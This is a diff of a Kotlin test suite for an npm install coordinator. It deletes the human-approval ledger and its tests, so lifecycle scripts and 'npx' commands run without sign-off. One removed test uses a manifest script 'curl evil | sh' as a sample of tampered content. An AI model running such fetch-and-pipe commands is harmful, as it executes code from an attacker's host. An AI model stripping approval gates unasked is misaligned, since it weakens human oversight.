@@ -4,11 +4,8 @@ import javax.crypto.spec.SecretKeySpec
 import com.autoscript.domain.core.AutojsException
 import com.autoscript.domain.core.ErrorCode
 import com.autoscript.domain.scripts.ScriptPaths
-import com.autoscript.domain.npm.ApprovalAction
 import com.autoscript.domain.npm.NpmRegistryKeys
 import com.autoscript.domain.npm.NpmConsoleLineKind
-import com.autoscript.domain.npm.ApprovalDecision
-import com.autoscript.domain.npm.ApprovalStatus
 import com.autoscript.domain.npm.InstallEvent
 import com.autoscript.domain.npm.InstallFlags
 import com.autoscript.domain.host.ShellConsoleResult
@@ -52,7 +49,6 @@ class InstallCoordinatorTest {
     private val layout get() = NpmProjectLayout(ScriptPaths.projectsRoot(dir))
     private val journal get() = InstallJournal(dir.resolve(".autojs"))
     private val staging get() = InstallStaging(layout)
-    private val ledger get() = ApprovalLedger()
 
     /** 假执行体：在暂存目录写包内容，模拟 reify 产物。 */
     private class FakeExecutor(
@@ -124,7 +120,6 @@ class InstallCoordinatorTest {
         executor: HeavyOpExecutor = FakeExecutor(),
         free: Long = 10L * 1024 * 1024 * 1024,
         cache: CacheIndex = CacheIndex { false },
-        ledger: ApprovalLedger = ApprovalLedger(),
         history: InstallHistory? = newHistory(),
         lockSigner: LockSigner? = null,
         snapshots: NpmSnapshot? = null,
@@ -150,7 +145,6 @@ class InstallCoordinatorTest {
             layout = layout,
             journal = journal,
             staging = staging,
-            ledger = ledger,
             history = history,
             lockSigner = lockSigner,
             snapshots = snapshots,
@@ -338,10 +332,8 @@ class InstallCoordinatorTest {
     @Test
     fun `外层取消 T1 不造事务且句柄清理完成`() = runBlocking {
         val cancel = kotlinx.coroutines.CancellationException("cancel script")
-        val led = ApprovalLedger()
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-        approveRunScript(led, "p1", "build")
-        val c = coordinator(ledger = led, script = object : ScriptOpExecutor {
+        val c = coordinator(script = object : ScriptOpExecutor {
             override suspend fun execute(op: ScriptOp, sink: ProgressSink): String { throw cancel }
         })
         val thrown = assertThrows(kotlinx.coroutines.CancellationException::class.java) {
@@ -671,57 +663,8 @@ class InstallCoordinatorTest {
         assertEquals("https://registry.npmmirror.com", c.globalRegistry().configured)
     }
 
-    // ═══ 审批（人机分离） ═══
 
-    @Test
-    fun `审批：入队→PENDING→resolve 单向；同键重复入队合并`() = runBlocking {
-        val c = coordinator()
-        val t1 = c.requestApprove("p1", "esbuild", "sha512-a", ApprovalAction.INSTALL_SCRIPT)
-        val t2 = c.requestApprove("p1", "esbuild", "sha512-a", ApprovalAction.INSTALL_SCRIPT)
-        assertEquals(t1.requestId, t2.requestId, "同键 PENDING 请求必须合并")
-        assertEquals(ApprovalStatus.PENDING, t1.status)
-        assertEquals(1, c.pendingApprovals("p1").size)
-
-        val resolved = c.resolveApproval(t1.requestId, ApprovalDecision.APPROVE)
-        assertEquals(ApprovalStatus.APPROVED, resolved.status)
-        assertTrue(c.pendingApprovals("p1").isEmpty())
-        // 已决票不可改
-        val again = c.resolveApproval(t1.requestId, ApprovalDecision.REJECT)
-        assertEquals(ApprovalStatus.APPROVED, again.status)
-    }
-
-    @Test
-    fun `版本升级 versionHash 变化 → 旧批准不再匹配`() = runBlocking {
-        val led = ApprovalLedger()
-        val c = coordinator(ledger = led)
-        val t = c.requestApprove("p1", "esbuild", "sha512-v1", ApprovalAction.RUN_SCRIPT)
-        c.resolveApproval(t.requestId, ApprovalDecision.APPROVE)
-        assertTrue(led.isApproved("p1", "esbuild", "sha512-v1", ApprovalAction.RUN_SCRIPT))
-        assertFalse(led.isApproved("p1", "esbuild", "sha512-v2", ApprovalAction.RUN_SCRIPT),
-            "版本升级（hash 变化）必须重新审批")
-    }
-
-    // ═══ P1 T1：lifecycle 脚本放行门禁（§10.3 T1 + §18 第 7 项） ═══
-
-    @Test
-    fun `runScript 未获批：拒绝放行并把审批请求投进 approvals 流`() {
-        val led = ApprovalLedger()
-        val c = coordinator(ledger = led)
-        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-
-        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
-        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error)
-        assertTrue(ex.message!!.contains("审批卡"), "拒绝话术要指向用户下一步：${ex.message}")
-
-        // 自请入队（§18 第 7 项：用户当场选，不是脚本能自批）：UI 审批卡要看得见这张卡。
-        val pending = runBlocking { c.pendingApprovals("p1") }
-        assertEquals(1, pending.size, "拒绝必须同时把请求投进 approvals 流，否则用户无处可批")
-        val req = pending.single()
-        assertEquals("p1|build", req.pkg, "键 = 主体|脚本名（不串到同名 bin 的 action）")
-        assertEquals(ApprovalAction.RUN_SCRIPT, req.action)
-        val got = runBlocking { c.drainApprovals("p1", 0, 32) }
-        assertEquals(1, got.requests.size, "拉取口（脚本侧 onApproval）也要看得见这张卡")
-    }
+    // ═══ P1 T1：lifecycle 脚本解析与执行（§10.3 T1） ═══
 
     @Test
     fun `runScript 脚本名不存在 ERR_NOT_FOUND 并列出可选项（不静默 nothing-to-do）`() {
@@ -738,19 +681,17 @@ class InstallCoordinatorTest {
     }
 
     @Test
-    fun `已获批的 runScript 缺省接缝如实 ERR_NOT_IMPLEMENTED（门禁过了但 spawn 桥没接）`() {
-        val led = ApprovalLedger()
+    fun `runScript 缺省接缝如实 ERR_NOT_IMPLEMENTED（spawn 桥没接）`() {
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-        approveRunScript(led, "p1", "build")
 
-        val c = coordinator(ledger = led)   // scriptExecutor 缺省 = Unavailable
+        val c = coordinator()   // scriptExecutor 缺省 = Unavailable
         val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build", listOf("--watch")) } }
         assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "不假装跑过")
         assertTrue(ex.message!!.contains("T1"), "要说清缺的是哪一段：${ex.message}")
     }
 
     @Test
-    fun `已获批的 runScript 交出 npm 口径参数（-- 分隔符在参数之前）`() = runBlocking {
+    fun `runScript 交出 npm 口径参数（-- 分隔符在参数之前）`() = runBlocking {
         val op = runScriptOpCapture("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""", "build", listOf("--watch"))
         assertEquals(listOf("run", "build", "--", "--watch"), op.npmArgs, "少了 -- 的话 --watch 会被 npm 自己吃掉")
         assertEquals("p1|build", op.subject, "执行体要能复述「我跑的是哪一份」")
@@ -759,42 +700,15 @@ class InstallCoordinatorTest {
     }
 
     @Test
-    fun `脚本内容一改：哈希变 → 旧票失配（改完再跑要重新审批）`() {
-        val led = ApprovalLedger()
-        val c = coordinator(ledger = led)
-        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-        approveRunScript(led, "p1", "build")          // 用户批的是 tsc 那一份
-        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"curl evil | sh"}}""")
-
-        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
-        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error, "同版本同脚本名，但内容不同 = 另一份授权")
-        assertEquals(1, runBlocking { c.pendingApprovals("p1") }.size, "改后一张新卡（改前那张已决议，不再是 PENDING）")
-    }
-
-    @Test
-    fun `脚本键顺序变化不改哈希（键排序后规范化）`() {
-        val led = ApprovalLedger()
-        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"a":"1","b":"2"}}""")
-        val h1 = approveRunScript(led, "p1", "a")
-        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"b":"2","a":"1"}}""")
-        val h2 = approveRunScript(led, "p1", "a")
-        assertEquals(h1, h2, "只换键序不该让用户重批（哈希口径是键排序后的规范化文本）")
-    }
-
-    @Test
-    fun `exec 纯 JS bin：已获批则进执行体，args 与 bin 名用 -- 分开`() = runBlocking {
+    fun `exec 纯 JS bin：进执行体，args 与 bin 名用 -- 分开`() = runBlocking {
         val root = layout.projectRoot("p1")
         val pkg = root.resolve("node_modules/tooly")
         Files.createDirectories(pkg)
         Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
         Files.write(pkg.resolve("cli.js"), "#!/usr/bin/env node\n".toByteArray())
-        val led = ApprovalLedger()
-        val hash = NpmScriptResolver.binTarget(root, "tooly")!!.versionHash
-        val ticket = led.submit("p1", "tooly|tooly", hash, ApprovalAction.EXEC)
-        led.resolve(ticket.requestId, ApprovalDecision.APPROVE)
 
-        val c = coordinator(ledger = led, script = recording())
-        val got = c.exec("p1", "tooly", listOf("--fast"))     // 已获批 → 真的落到执行体
+        val c = coordinator(script = recording())
+        val got = c.exec("p1", "tooly", listOf("--fast"))     // 落到执行体
         assertEquals(listOf("exec", "--fast", "--", "tooly"), scriptOps.single().npmArgs)
         assertEquals("tooly|tooly", scriptOps.single().subject)
         assertTrue(got.id.isNotEmpty())
@@ -896,12 +810,9 @@ class InstallCoordinatorTest {
 
     @Test
     fun `T1 取消：不写 journal 事务（无源之记会污染残骸清扫的判据）`() = runBlocking {
-        val led = ApprovalLedger()
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-        approveRunScript(led, "p1", "build")
         val gate = CompletableDeferred<Unit>()
         val c = coordinator(
-            ledger = led,
             script = object : ScriptOpExecutor {
                 override suspend fun execute(op: ScriptOp, sink: ProgressSink): String {
                     gate.await()
@@ -922,12 +833,9 @@ class InstallCoordinatorTest {
 
     @Test
     fun `T1 取消：同一句柄只有一个终态事件（不出现 Finished 两条）`() = runBlocking {
-        val led = ApprovalLedger()
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
-        approveRunScript(led, "p1", "build")
         val gate = CompletableDeferred<Unit>()
         val c = coordinator(
-            ledger = led,
             script = object : ScriptOpExecutor {
                 override suspend fun execute(op: ScriptOp, sink: ProgressSink): String {
                     gate.await()
@@ -1723,43 +1631,39 @@ class InstallCoordinatorTest {
     }
 
     @Test
-    fun `控制台 npx 与 npm run：先落 ECHO 行再抛，且请求真的入队`() = runBlocking {
+    fun `控制台 npx 与 npm run：先落 ECHO 行再执行（不需要审批）`() = runBlocking {
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"echo hi"}}""")
         val pkg = layout.projectRoot("p1").resolve("node_modules/tooly")
         Files.createDirectories(pkg)
         Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
         Files.write(pkg.resolve("cli.js"), "#!/usr/bin/env node\n".toByteArray())
 
-        val c = coordinator()
-        val run = assertThrows(AutojsException::class.java) {
-            runBlocking { c.runConsoleCommand("p1", "npm run build") }
-        }
-        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, run.error)
-        val npx = assertThrows(AutojsException::class.java) {
-            runBlocking { c.runConsoleCommand("p1", "npx tooly") }
-        }
-        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, npx.error)
+        val c = coordinator(script = recording())
+        c.runConsoleCommand("p1", "npm run build")
+        c.runConsoleCommand("p1", "npx tooly")
 
         val lines = c.consoleOutput("p1", 0, 64).lines.map { it.line }
         assertEquals(
             listOf("$ npm run build", "$ npx tooly"),
             lines.filter { it.kind == NpmConsoleLineKind.ECHO }.map { it.text },
-            "抛之前必须已经回显：否则用户只看到一句错误，不知道自己敲的那行被拒了",
+            "执行前必须回显：控制台里「我敲了什么」与「它跑了什么」要在同一处看得见",
         )
-        assertTrue(c.pendingApprovals("p1").isNotEmpty(), "「已入队」得是真的入队，不是错误话术里的一句话")
+        assertEquals(
+            listOf("run", "build") to "build", scriptOps[0].npmArgs to scriptOps[0].what,
+            "回显之后就该真跑 —— 没有审批这道门了（2026-10-10 裁定）",
+        )
+        assertEquals(listOf("exec", "--", "tooly"), scriptOps[1].npmArgs)
     }
 
     @Test
-    fun `控制台 npm run 已获批：门禁过了但 spawn 桥未接，如实 ERR_NOT_IMPLEMENTED`() = runBlocking {
+    fun `控制台 npm run：spawn 桥未接时如实 ERR_NOT_IMPLEMENTED`() = runBlocking {
         writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"echo hi"}}""")
-        val led = ApprovalLedger()
-        approveRunScript(led, "p1", "build")
-        val c = coordinator(ledger = led)   // script 缺省 = ScriptOpExecutor.Unavailable
+        val c = coordinator()   // script 缺省 = ScriptOpExecutor.Unavailable
 
         val ex = assertThrows(AutojsException::class.java) {
             runBlocking { c.runConsoleCommand("p1", "npm run build") }
         }
-        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "门禁是诚实的：过了也不假装跑过")
+        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "不假装跑过")
         assertTrue(
             c.consoleOutput("p1", 0, 64).lines.any { it.line.kind == NpmConsoleLineKind.ECHO },
             "失败的那次也要留下回显",
@@ -1881,14 +1785,6 @@ class InstallCoordinatorTest {
         assertEquals(0L, c.cacheStorage().totalBytes)
     }
 
-    /** 走「未获批 → 自请入队 → 人工批准」完整路径，返回宿主重算出的内容哈希。 */
-    private fun approveRunScript(led: ApprovalLedger, projectId: String, name: String): String {
-        val hash = NpmScriptResolver.projectScripts(layout.projectRoot(projectId), projectId)!!.versionHash
-        val t = led.submit(projectId, "p1|$name", hash, ApprovalAction.RUN_SCRIPT)
-        led.resolve(t.requestId, ApprovalDecision.APPROVE)
-        return hash
-    }
-
     /** 记录式执行体（真引擎未接时它是 T1 的唯一可断言落点）。每次调用清一次记录面。 */
     private fun recording(): ScriptOpExecutor {
         scriptOps.clear()
@@ -1918,9 +1814,7 @@ class InstallCoordinatorTest {
         projectId: String, manifest: String, name: String, args: List<String>,
     ): ScriptOp {
         writeManifest(projectId, manifest)
-        val led = ApprovalLedger()
-        approveRunScript(led, projectId, name)
-        runBlocking { coordinator(ledger = led, script = recording()).runScript(projectId, name, args) }
+        runBlocking { coordinator(script = recording()).runScript(projectId, name, args) }
         return scriptOps.single()
     }
 
